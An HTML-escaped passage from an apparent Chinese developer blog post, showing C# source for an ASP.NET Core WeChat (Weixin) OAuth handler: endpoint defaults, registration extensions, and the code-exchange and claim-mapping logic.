&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_47a7da3e-c2a2-45d6-a605-7c656d9466a9&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_47a7da3e-c2a2-45d6-a605-7c656d9466a9&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_47a7da3e-c2a2-45d6-a605-7c656d9466a9&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default values for Weixin authentication.
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WeixinAuthenticationDefaults
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;AuthenticationOptions.DefaultAuthenticateScheme&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; AuthenticationScheme = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; DisplayName = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;RemoteAuthenticationOptions.CallbackPath&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; CallbackPath = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/signin-weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;AuthenticationSchemeOptions.ClaimsIssuer&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Issuer = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Weixin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;OAuth.OAuthOptions.AuthorizationEndpoint&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; AuthorizationEndpoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://open.weixin.qq.com/connect/qrconnect&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;OAuth.OAuthOptions.TokenEndpoint&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; TokenEndpoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://api.weixin.qq.com/sns/oauth2/access_token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Default value for &lt;/span&gt;&lt;span&gt;&amp;lt;see cref=&quot;OAuth.OAuthOptions.UserInformationEndpoint&quot;/&amp;gt;&lt;/span&gt;&lt;span&gt;.
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; UserInformationEndpoint = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://api.weixin.qq.com/sns/userinfo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeiXinAuthenticationExtensions.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;&lt;img id=&quot;code_img_closed_5d15d1ef-0fe6-4215-9c41-e2ffded1d87c&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_5d15d1ef-0fe6-4215-9c41-e2ffded1d87c&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_5d15d1ef-0fe6-4215-9c41-e2ffded1d87c&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;75&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WeiXinAuthenticationExtensions
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt;&lt;span&gt; AuthenticationBuilder builder)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; builder.AddWeixinAuthentication(WeixinAuthenticationDefaults.AuthenticationScheme, WeixinAuthenticationDefaults.DisplayName, options =&amp;gt;&lt;span&gt; { });
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt; AuthenticationBuilder builder, Action&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt; configureOptions)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; builder.AddWeixinAuthentication(WeixinAuthenticationDefaults.AuthenticationScheme, WeixinAuthenticationDefaults.DisplayName, configureOptions);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt; AuthenticationBuilder builder, &lt;span&gt;string&lt;/span&gt; authenticationScheme, Action&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt; configureOptions)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; builder.AddWeixinAuthentication(authenticationScheme, WeixinAuthenticationDefaults.DisplayName, configureOptions);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; AuthenticationBuilder AddWeixinAuthentication(&lt;span&gt;this&lt;/span&gt; AuthenticationBuilder builder, &lt;span&gt;string&lt;/span&gt; authenticationScheme, &lt;span&gt;string&lt;/span&gt; displayName, Action&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt; configureOptions)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; builder.AddOAuth&amp;lt;WeixinAuthenticationOptions, WeixinAuthenticationHandler&amp;gt;&lt;span&gt;(authenticationScheme, displayName, configureOptions);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;WeixinAuthenticationHandler.cs&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;66&quot;&gt;&lt;img id=&quot;code_img_closed_35fb18a8-46f0-4032-8c60-66db10ecaa29&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_35fb18a8-46f0-4032-8c60-66db10ecaa29&quot; class=&quot;code_img_opened&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_35fb18a8-46f0-4032-8c60-66db10ecaa29&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;127&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; WeixinAuthenticationHandler : OAuthHandler&amp;lt;WeixinAuthenticationOptions&amp;gt;&lt;span&gt;
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; WeixinAuthenticationHandler(IOptionsMonitor&amp;lt;WeixinAuthenticationOptions&amp;gt; options, ILoggerFactory logger, UrlEncoder encoder, ISystemClock clock) : &lt;span&gt;base&lt;/span&gt;&lt;span&gt;(options, logger, encoder, clock)
        {
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;  Last step:
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt;  create ticket from remote server
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;identity&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;properties&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;tokens&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;AuthenticationTicket&amp;gt;&lt;span&gt; CreateTicketAsync(ClaimsIdentity identity, AuthenticationProperties properties, OAuthTokenResponse tokens)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; address = QueryHelpers.AddQueryString(Options.UserInformationEndpoint, &lt;span&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt;
            {
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;access_token&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; tokens.AccessToken,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] = tokens.Response.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
            });

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; response = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; Backchannel.GetAsync(address);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;response.IsSuccessStatusCode)
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving the user profile: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; HttpRequestException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving user information.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; payload = JObject.Parse(&lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;string&lt;/span&gt;.IsNullOrEmpty(payload.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;errcode&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)))
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving the user profile: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; HttpRequestException(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving user information.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }

            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.NameIdentifier, WeixinAuthenticationHelper.GetUnionid(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.Name, WeixinAuthenticationHelper.GetNickname(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.Gender, WeixinAuthenticationHelper.GetSex(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Claim(ClaimTypes.Country, WeixinAuthenticationHelper.GetCountry(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:openid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetOpenId(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:province&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetProvince(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:city&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetCity(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:headimgurl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetHeadimgUrl(payload), Options.ClaimsIssuer));
            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:privilege&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, WeixinAuthenticationHelper.GetPrivilege(payload), Options.ClaimsIssuer));

            identity.AddClaim(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; Claim(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;urn:weixin:user_info&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, payload.ToString(), Options.ClaimsIssuer));

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; context = &lt;span&gt;new&lt;/span&gt; OAuthCreatingTicketContext(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ClaimsPrincipal(identity), properties, Context, Scheme, Options, Backchannel, tokens, payload);
            context.RunClaimActions();

            &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; Events.CreatingTicket(context);

            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;new&lt;/span&gt;&lt;span&gt; AuthenticationTicket(context.Principal, context.Properties, Scheme.Name);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; Step 2：通过code获取access_token
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;OAuthTokenResponse&amp;gt; ExchangeCodeAsync(&lt;span&gt;string&lt;/span&gt; code, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; redirectUri)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; address = QueryHelpers.AddQueryString(Options.TokenEndpoint, &lt;span&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt;()
            {
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;appid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.ClientId,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;secret&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.ClientSecret,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; code,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;grant_type&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;authorization_code&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
            });

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; response = &lt;span&gt;await&lt;/span&gt;&lt;span&gt; Backchannel.GetAsync(address);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;response.IsSuccessStatusCode)
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; OAuthTokenResponse.Failed(&lt;span&gt;new&lt;/span&gt; Exception(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
            }

            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; payload = JObject.Parse(&lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;string&lt;/span&gt;.IsNullOrEmpty(payload.Value&amp;lt;&lt;span&gt;string&lt;/span&gt;&amp;gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;errcode&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)))
            {
                Logger.LogError(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token: the remote server &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; +
                                &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;returned a {Status} response with the following payload: {Headers} {Body}.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Status: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.StatusCode,
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Headers: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt; response.Headers.ToString(),
                                &lt;/span&gt;&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; Body: &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt; &lt;span&gt;await&lt;/span&gt;&lt;span&gt; response.Content.ReadAsStringAsync());

                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; OAuthTokenResponse.Failed(&lt;span&gt;new&lt;/span&gt; Exception(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;An error occurred while retrieving an access token.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; OAuthTokenResponse.Success(payload);
        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt;  Step 1：请求CODE 
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt;&lt;span&gt;  构建用户授权地址
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt; 
        &lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; BuildChallengeUrl(AuthenticationProperties properties, &lt;span&gt;string&lt;/span&gt;&lt;span&gt; redirectUri)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; QueryHelpers.AddQueryString(Options.AuthorizationEndpoint, &lt;span&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt;&lt;span&gt;
            {
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;appid&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.ClientId,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;scope&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; FormatScope(),
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;response_type&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;code&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;redirect_uri&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; redirectUri,
                [&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;state&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;] =&lt;span&gt; Options.StateDataFormat.Protect(properties)
            });
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;override&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; FormatScope()
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;.Join(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, Options.Scope);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
